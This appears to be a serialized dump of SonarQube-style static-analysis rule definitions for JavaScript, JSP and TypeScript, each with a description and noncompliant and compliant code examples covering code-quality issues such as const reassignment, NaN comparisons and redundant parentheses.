javascriptS4143:Collection elements should not be replaced unconditionally"MAJOR*js:®<p>It is highly suspicious when a value is saved for a key or index and then unconditionally overwritten. Such replacements are likely in error.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
 fruits[1] = "banana";
 fruits[1] = "apple";  // Noncompliant - value on index 1 is overwritten

 myMap.set("key", 1);
 myMap.set("key", 2); // Noncompliant - value for key "key" is replaced

 mySet.add(1);
 mySet.add(1); // Noncompliant - element is already in the set
</pre>ZBUG
¿
javascript:BitwiseOperators†

javascriptBitwiseOperators8Bitwise operators should not be used in boolean contexts"MAJOR*js:µ<p>The bitwise operators <code>&amp;</code>, <code>|</code> can be mistaken for the boolean operators <code>&amp;&amp;</code> and <code>||</code>.
</p>
<p>This rule raises an issue when <code>&amp;</code> or <code>|</code> is used in a boolean context.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a &amp; b) { ... } // Noncompliant; &amp; used in error
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a &amp;&amp; b) { ... }
</pre>
<h2>Exceptions</h2>
<p>When a file contains other bitwise operations, (<code>^</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;&gt;</code>, <code>&gt;&gt;</code>,
<code>~</code>, <code>&amp;=</code>, <code>^=</code>, <code>|=</code>, <code>&lt;&lt;=</code>, <code>&gt;&gt;=</code>, <code>&gt;&gt;&gt;=</code> and
<code>&amp;</code> or <code>|</code> used with a numeric literal as the right operand) all issues in the file are ignored, because it is evidence that
bitwise operations are truly intended in the file.</p>ZBUG
£
javascript:S3500é

javascriptS35007Attempts should not be made to update "const" variables"MAJOR*js:Ø<p>Variables declared with <code>const</code> cannot be modified. Unfortunately, attempts to do so don't always raise an error; in a non-ES2015
environment, such an attempt might simply be ignored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const pi = "yes, please";
pi = 3.14;  // Noncompliant
</pre>ZBUG
Ø
javascript:S3984ö

javascriptS39841Errors should not be created without being thrown"MAJOR*js:¡<p>Creating a new <code>Error</code> without actually throwing it is useless and is probably due to a mistake.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x &lt; 0) {
  new Error("x must be nonnegative");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x &lt; 0) {
  throw new Error("x must be nonnegative");
}
</pre>ZBUG
 
javascript:S1440µ

javascriptS14407"===" and "!==" should be used instead of "==" and "!=""MAJOR*js:œ<p>The <code>==</code> and <code>!=</code> operators do type coercion before comparing values. This is bad because it can mask type errors. For
example, it evaluates <code>' \t\r\n' == 0</code> as <code>true</code>.</p>
<p>It is best to always use the side-effect-less <code>===</code> and <code>!==</code> operators instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (var == 'howdy') {...} // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (var === 'howdy') {...}
</pre>
<h2>Exceptions</h2>
<p>Even if testing the equality of a variable against null doesn't do exactly what most JavaScript developers believe, usage of <code>==</code> or
<code>!=</code> is tolerated in such context. In the following case, if <code>foo</code> hasn't been initialized, its default value is not
<code>null</code> but <code>undefined</code>. Nevertheless <code>undefined == null</code>, so JavaScript developers get the expected behavior.</p>
<pre>
if(foo == null) {...}
</pre>Z
CODE_SMELL
Ë
javascript:S3981”

javascriptS3981?Collection sizes and array length comparisons should make sense"MAJOR*js:Ï<p>The size of a collection and the length of an array are always greater than or equal to zero. So testing that a size or length is greater than or
equal to zero doesn't make sense, since the result is always <code>true</code>. Similarly testing that it is less than zero will always return
<code>false</code>. Perhaps the intent was to check the non-emptiness of the collection or array instead. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (someSet.size &gt;= 0) {...} // Noncompliant

if (someMap.size &lt; 0) {...} // Noncompliant

const result = someArray.length &gt;= 0;  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if (someSet.size &gt; 0) {...}

if (someMap.size == 0) {...}

const result = someArray.length &gt; 0;
</pre>ZBUG

javascript:S2770€

javascriptS2770,Deprecated jQuery methods should not be used"MAJOR*js:Ä<p>Deprecation is a warning that a method has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth
transition away from the aging, soon-to-be-retired technology.</p>
<p>This rule raises an issue when any of the following methods is used:</p>
<ul>
  <li> <code>.andSelf()</code> </li>
  <li> <code>.context</code> </li>
  <li> <code>.die()</code> </li>
  <li> <code>.error()</code> </li>
  <li> <code>jQuery.boxModel</code> </li>
  <li> <code>jQuery.browser</code> </li>
  <li> <code>jQuery.sub()</code> </li>
  <li> <code>jQuery.support</code> </li>
  <li> <code>.live()</code> </li>
  <li> <code>.load()</code> </li>
  <li> <code>.selector</code> </li>
  <li> <code>.size()</code> </li>
  <li> <code>.toggle()</code> </li>
  <li> <code>.unload()</code> </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
é
javascript:S2898˘

javascriptS28986"[type=...]" should be used to select elements by type"MAJOR*js:î<p>While <code>:&lt;element_type&gt;</code> and <code>[type="&lt;element_type&gt;"]</code> can both be used in jQuery to select elements by their
type, <code>[type="&lt;element_type&gt;"]</code> is far faster because it can take advantage of the native DOM <code>querySelectorAll()</code> method
in modern browsers. </p>
<p>This rule raises an issue when following selectors are used:</p>
<ul>
  <li> <code>:checkbox</code> </li>
  <li> <code>:file</code> </li>
  <li> <code>:image</code> </li>
  <li> <code>:password</code> </li>
  <li> <code>:radio</code> </li>
  <li> <code>:reset</code> </li>
  <li> <code>:text</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var input = $( "form input:radio" ); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var input = $( "form input[type=radio]" ); // Compliant
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
é
'javascript:FunctionDefinitionInsideLoop‚

javascriptFunctionDefinitionInsideLoop,Functions should not be defined inside loops"MAJOR*js:<p>Defining a function inside of a loop can yield unexpected results. Such a function keeps references to the variables which are defined in outer
scopes. All function instances created inside the loop therefore see the same values for these variables, which is probably not expected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var funs = [];
for (var i = 0; i &lt; 13; i++) {
  funs[i] = function() { // Non-Compliant
    return i;
  };
}
console.log(funs[0]()); // 13 instead of 0
console.log(funs[1]()); // 13 instead of 1
console.log(funs[2]()); // 13 instead of 2
console.log(funs[3]()); // 13 instead of 3
...
</pre>Z
CODE_SMELL

javascript:S4030€

javascriptS4030,Collection and array contents should be used"MAJOR*js:Ä<p>When a collection is populated but its contents are never used, then it is surely some kind of mistake. Either refactoring has rendered the
collection moot, or an access is missing.</p>
<p>This rule raises an issue when no methods are called on a collection other than those that add or remove values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function getLength(a, b, c) {
  const strings = [];  // Noncompliant
  strings.push(a);
  strings.push(b);
  strings.push(c);

  return a.length + b.length + c.length;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function getLength(a, b, c) {
  return a.length + b.length + c.length;
}
</pre>Z
CODE_SMELL
Ø
common-jsp:FailedUnitTestsê

common-jspFailedUnitTests!Failed unit tests should be fixed"MAJOR*jsp:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
å
common-jsp:SkippedUnitTestsÏ

common-jspSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*jsp:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL

common-jsp:DuplicatedBlocks–

common-jspDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*jsp:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ö
%common-jsp:InsufficientCommentDensity

common-jspInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*jsp:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
⁄
#common-jsp:InsufficientLineCoverage≤

common-jspInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*jsp:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
Ê
%common-jsp:InsufficientBranchCoverageº

common-jspInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*jsp:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
í

typescript:S2589˝	

typescriptS2589,Boolean expressions should not be gratuitous"MAJOR*ts:¢	<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (a) {
  if (a) { // Noncompliant
    doSomething();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (a) {
  if (b) {
    doSomething();
  }
}

// or
if (a) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/489">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
è
typescript:S3799˙

typescriptS3799*Destructuring patterns should not be empty"MAJOR*ts:®<p>Destructuring is a convenient way of extracting multiple values from data stored in (possibly nested) objects and arrays. However, it is possible
to create an empty pattern that has no effect. When empty curly braces or brackets are used to the right of a property name most of the time the
intent was to use a default value instead.</p>
<p>This rule raises an issue when empty destructuring pattern is used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var {a: {}, b} = myObj; // Noncompliant
function foo({first: [], second}) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var {a = {}, b} = myObj;
function foo({first = [], second}) {
  // ...
}
</pre>ZBUG
ä
typescript:S4124ı

typescriptS41245Constructors should not be declared inside interfaces"MAJOR*ts:ò<p>Declare a constructor inside an <code>interface</code>, and you will get a simple method with the name "constructor". The same thing will happen if
you create a <code>new</code> method inside the <code>interface</code>: you'll get a simple method named "new".</p>
<p>Instead, the intent was probably to specify that the type did not originate from a TypeScript file. In such cases, just use the <code>declare
class</code> syntax.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface TypeDeclaredElsewhere {
  someMethod(): number;
  new(b: boolean): TypeDeclaredElsewhere; // Noncompliant
  constructor(b: boolean): void; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
declare class TypeDeclaredElsewhere {
  someMethod(): number;
  constructor(b: boolean);
}
</pre>
<p> </p>ZBUG
ÿ
typescript:ParsingErrorº

typescriptParsingErrorJavaScript parser failure"MAJOR*ts:Ì<p>When the JavaScript parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the
number of files that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
—
typescript:S103Ω

typescriptS103Lines should not be too long"MAJOR*ts:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
≥
typescript:S1656û

typescriptS1656%Variables should not be self-assigned"MAJOR*ts:—<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function setName(name) {
    name = name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function setName(name) {
    this.name = name;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
Î
typescript:S905◊

typescriptS905PNon-empty statements should change control flow or have at least one side-effect"MAJOR*ts:‡<p>Any statement (other than a null statement, which means a statement containing only a semicolon <code>;</code>) which has no side effect and does
not result in a change of control flow will normally indicate a programming error, and therefore should be refactored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a == 1; // Noncompliant; was assignment intended?
var msg = "Hello, "
  "World!"; // Noncompliant; have we forgotten '+' operator on previous line?
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/482">MITRE, CWE-482</a> - Comparing instead of Assigning </li>
</ul>ZBUG
Á
typescript:S104”

typescriptS104,Files should not have too many lines of code"MAJOR*ts:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
ó
typescript:S107É

typescriptS107-Functions should not have too many parameters"MAJOR*ts:®<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
function doSomething(param1, param2, param3, param4, param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(param1, param2, param3, param4) {
...
}
</pre>Z
CODE_SMELL
õ
typescript:S106á

typescriptS106<Standard outputs should not be used directly to log anything"MAJOR*ts:ù<p>Debug statements are always useful during development. But include them in production code - particularly in code that runs client-side - and you
run the risk of inadvertently exposing sensitive information, slowing down the browser, or even erroring-out the site for some users.</p>
<h2>Noncompliant Code Example</h2>
<pre>
console.log(password_entered); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/RoElAQ">CERT, ERR02-J.</a> - Prevent exceptions while logging data </li>
</ul>Z
CODE_SMELL
õ
typescript:S108á

typescriptS108.Nested blocks of code should not be left empty"MAJOR*ts:´<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 0; i &lt; length; i++) {}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty. Moreover <code>catch</code> blocks are ignored.</p>Z
CODE_SMELL
‡
typescript:S109Ã

typescriptS109 Magic numbers should not be used"MAJOR*ts:˛<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loop, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned to clearly named variables before being used.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething() {
  for (let i = 0; i &lt; 4; i++) {    // Noncompliant, 4 is a magic number
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething() {
  const numberOfCycles = 4;
  for (let i = 0; i &lt; numberOfCycles; i++) {
    // ...
  }
}
</pre>Z
CODE_SMELL
…
typescript:S2234¥

typescriptS22340Parameters should be passed in the correct order"MAJOR*ts:’<p>When the names of arguments in a function call match the names of the function parameters, it contributes to clearer, more readable code. However,
when the names match, but are passed in a different order than the function parameters, it indicates a mistake in the parameter order which will
likely lead to unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function divide(divisor, dividend) {
  return divisor/dividend;
}

function doTheThing() {
  var divisor = 15;
  var dividend = 5;

  var result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function divide(divisor, dividend) {
  return divisor/dividend;
}

function doTheThing() {
  var divisor = 15;
  var dividend = 5;

  var result = divide(divisor, dividend);
  //...
}
</pre>Z
CODE_SMELL
æ	
typescript:S2870©	

typescriptS2870%"delete" should not be used on arrays"MAJOR*ts:’<p>The <code>delete</code> operator can be used to remove a property from any object. Arrays are objects, so the <code>delete</code> operator can be
used here too, but if it is, a hole will be left in the array because the indexes/keys won't be shifted to reflect the deletion. </p>
<p>The proper method for removing an element at a certain index would be:</p>
<ul>
  <li> <code>Array.prototype.splice</code> - add/remove elements from the array </li>
  <li> <code>Array.prototype.pop</code> - add/remove elements from the end of the array </li>
  <li> <code>Array.prototype.shift</code> - add/remove elements from the beginning of the array </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
var myArray = ['a', 'b', 'c', 'd'];

delete myArray[2];  // Noncompliant. myArray =&gt; ['a', 'b', undefined, 'd']
console.log(myArray[2]); // expected value was 'd' but output is undefined
</pre>
<h2>Compliant Solution</h2>
<pre>
var myArray = ['a', 'b', 'c', 'd'];

// removes 1 element from index 2
removed = myArray.splice(2, 1);  // myArray =&gt; ['a', 'b', 'd']
console.log(myArray[2]); // outputs 'd'
</pre>Z
CODE_SMELL
È
typescript:S4139‘

typescriptS4139*"for in" should not be used with iterables"MAJOR*ts:˚<p>If you have an iterable, such as an array, set, or list, your best option for looping through its values is the <code>for of</code> syntax. Use
<code>for in</code> and you'll iterate the properties, rather than the values.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const arr = [4, 3, 2, 1];

for (let value in arr) {  // Noncompliant
  console.log(value);  // logs 0, 1, 2, 3
}
</pre>
<h2>Compliant Solution</h2>
<pre>
const arr = [4, 3, 2, 1];

for (let value of arr) {
  console.log(value);
}
</pre>Z
CODE_SMELL
¿
typescript:S122¨

typescriptS122&Statements should be on separate lines"MAJOR*ts:ÿ<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
foo(); bar(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
foo();
bar();
</pre>Z
CODE_SMELL
˙

typescript:S881Ê


typescriptS881~Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression"MAJOR*ts:∫	<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwE">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/fYAyAQ">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side
  effects </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/yQC7AQ">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the
  same object within an expression </li>
</ul>Z
CODE_SMELL
ö
typescript:S2757Ö

typescriptS2757=Non-existent operators '=+', '=-' and '=!' should not be used"MAJOR*ts:†<p>The use of operators pairs (<code>=+</code>, <code>=-</code> or <code>=!</code>) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code> and <code>=!</code> are used without any space between the two operators and when
there is at least one whitespace after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let target =-5;
let num = 3;

target =- num;  // Noncompliant; target = -3. Is that really what's meant?
target =+ num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
let target = -5;
let num = 3;

target = -num;  // Compliant; intent to assign inverse value of num is clear
target += num;
</pre>ZBUG
∫
typescript:S878¶

typescriptS878!Comma operator should not be used"MAJOR*ts:◊<p>The comma operator takes two expressions, executes them from left to right and returns the result of the second one. Use of this operator is
generally detrimental to the readability and reliability of code, and the same effect can be achieved by other means.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a += 2, a + b;  // What's the value of i ?
</pre>
<h2>Compliant Solution</h2>
<pre>
a +=  2;
i = a + b;
</pre>
<h2>Exceptions</h2>
<p>Use of comma operator is tolerated:</p>
<ul>
  <li> in initialization and increment expressions of <code>for</code> loops. </li>
</ul>
<pre>
for(i = 0, j = 5; i &lt; 6; i++, j++) { ... }
</pre>
<ul>
  <li> If the expression sequence is explicitly wrapped in parentheses. </li>
</ul>Z
CODE_SMELL
Ô
typescript:S4622⁄

typescriptS4622-Union types should not have too many elements"MAJOR*ts:˛<p>Union types represent a value that can be one of the several types. When a union type is used for a function parameter and it is accepting too many
types, it may indicate the function is having too many responsibilities. Sometimes it's worth creating a type alias for this union type. In all cases,
the code should be reviewed and refactored to make it more maintainable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
let x: MyType1 | MyType2 | MyType3 | MyType4; // Noncompliant

function foo(p1: string, p2: MyType1 | MyType2 | MyType3 | MyType4) { // Noncompliant
    // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
type MyUnionType = MyType1 | MyType2 | MyType3 | MyType4; // Compliant, "type" statements are ignored
let x: MyUnionType;

function foo(value: string, padding: MyUnionType) {
    // ...
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores union types part of <code>type</code> statement:</p>
<pre>
type MyUnionType = MyType1 | MyType2 | MyType3 | MyType4;
</pre>Z
CODE_SMELL
“	
typescript:S1751Ω	

typescriptS17515Loops with at most one iteration should be refactored"MAJOR*ts:‡<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (let i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  console.log("i is " + i);
  break;
}
...
for (let i = 0; i &lt; 10; i++) { // noncompliant, loop only executes once
  if (i == x) {
    break;
  } else {
    console.log("i is " + i);
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (let i = 0; i &lt; 10; i++) {
  console.log("i is " + i);
}
...
for (let i = 0; i &lt; 10; i++) {
  if (i == x) {
    break;
  } else {
    console.log("i is " + i);
  }
}
</pre>ZBUG
™	
typescript:S2688ï	

typescriptS2688'"NaN" should not be used in comparisons"MAJOR*ts:∆<p><code>NaN</code> is not equal to anything, even itself. Testing for equality or inequality against <code>NaN</code> will yield predictable results,
but probably not the ones you want. </p>
<p>Instead, the best way to see whether a variable is equal to <code>NaN</code> is to use <code>Number.isNaN()</code>, since ES2015, or (perhaps
counter-intuitively) to compare it to itself. Since <code>NaN !== NaN</code>, when <code>a !== a</code>, you know it must equal <code>NaN</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var a = NaN;

if (a === NaN) {  // Noncompliant; always false
  console.log("a is not a number");  // this is dead code
}
if (a !== NaN) { // Noncompliant; always true
  console.log("a is not NaN"); // this statement is not necessarily true
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (Number.isNaN(a)) {
  console.log("a is not a number");
}
if (!Number.isNaN(a)) {
  console.log("a is not NaN");
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7AEqAQ">CERT, NUM07-J.</a> - Do not attempt comparisons with NaN </li>
</ul>ZBUG
‚
typescript:S2201Õ

typescriptS2201GReturn values from functions without side effects should not be ignored"MAJOR*ts:ﬁ<p>When the call to a function doesn't have any side effects, what is the point of making the call if the results are ignored? In such case, either
the function call is useless and should be dropped or the source code doesn't behave as expected. </p>
<p>To prevent generating any false-positives, this rule triggers an issues only on a predefined list of known objects &amp; functions. </p>
<h2>Noncompliant Code Example</h2>
<pre>
'hello'.lastIndexOf('e'); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
let char = 'hello'.lastIndexOf('e');
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9YIRAQ">CERT, EXP12-C.</a> - Do not ignore values returned by functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gEqAQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
</ul>ZBUG
¢
typescript:S4624ç

typescriptS4624&Template literals should not be nested"MAJOR*ts:∏<p>Template literals (previously named "template strings") are an elegant way to build a string without using the <code>+</code> operator to make
strings concatenation more readable. </p>
<p>However, it's possible to build complex string literals by nesting together multiple template literals, and therefore lose readability and
maintainability.</p>
<p>In such situations, it's preferable to move the nested template into a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let color = "red";
let count = 3;
let message = `I have ${color ? `${count} ${color}` : count} apples`; // Noncompliant; nested template strings not easy to read
</pre>
<h2>Compliant Solution</h2>
<pre>
let color = "red";
let count = 3;
let apples = color ? `${count} ${color}` : count;
let message = `I have ${apples} apples`;
</pre>Z
CODE_SMELL
…
typescript:S2685¥

typescriptS2685<"arguments.caller" and "arguments.callee" should not be used"MAJOR*ts:…<p>Both <code>arguments.caller</code> and <code>arguments.callee</code> make quite a few optimizations impossible so they were deprecated in latest
versions of JavaScript. In fact, EcmaScript 5 forbids the use of both in <code>strict</code> mode, according to the docs:</p>
<blockquote>
  Arguments objects for strict mode functions define non-configurable accessor properties named "caller" and "callee" which throw a TypeError
  exception on access.
</blockquote>
<p>The same restriction applies to the function's <code>caller</code> and <code>arguments</code> properties in <code>strict</code> mode.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function whoCalled() {
   if (arguments.caller == null)   //Noncompliant
      console.log('I was called from the global scope.');
   else
      console.log(arguments.caller + ' called me!');  // Noncompliant

  console.log(whoCalled.caller);  // Noncompliant
  console.log(whoCalled.arguments);  // Noncompliant
}
</pre>Z
CODE_SMELL
Ì	
typescript:S4623ÿ	

typescriptS4623D"undefined" should not be passed as the value of optional parameters"MAJOR*ts:Â<p>Unlike in JavaScript, where every parameter can be omitted, in TypeScript you need to explicitly declare this in the function signature. Either you
add <code>?</code> in the parameter declaration and <code>undefined</code> will be automatically applied to this parameter. Or you add an initializer
with a default value in the parameter declaration. In the latter case, when passing <code>undefined</code> for such parameter, default value will be
applied as well. So it's better to avoid passing <code>undefined</code> value to an optional or default parameter because it creates more confusion
than it brings clarity. Note, that this rule is only applied to the last arguments in function call.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(x: number, y: string = "default", z?: number) {
  // ...
}

foo(42, undefined); // Noncompliant
foo(42, undefined, undefined); // Noncompliant
foo(42, undefined, 5); // OK, there is no other way to force default value for second parameter
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo(x: number, y: string = "default", z?: number) {
  // ...
}

foo(42);
</pre>Z
CODE_SMELL
ª
typescript:S1110¶

typescriptS11100Redundant pairs of parentheses should be removed"MAJOR*ts:«<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
let x = (y / 2 + 1);   //Compliant even if those parenthesis are useless for the compiler

if (a &amp;&amp; ((x+y &gt; 0))) {  // Noncompliant
  //...
}

return ((x + 1));  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
let x = (y / 2 + 1);

if (a &amp;&amp; (x+y &gt; 0)) {
  //...
}

return (x + 1);
</pre>Z
CODE_SMELL
≈
typescript:S1871∞

typescriptS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*ts:™<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1's implementation
    doFirstThing();
    doSomething();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if(a == 1) {
  doSomething();  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
  doSomethingElse();
} else {
  doSomething();
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule <a href='/coding_rules#rule_key=javascript%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if(a == 1) {
  doSomething();  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething();
}
</pre>Z
CODE_SMELL
á
typescript:S2681Ú

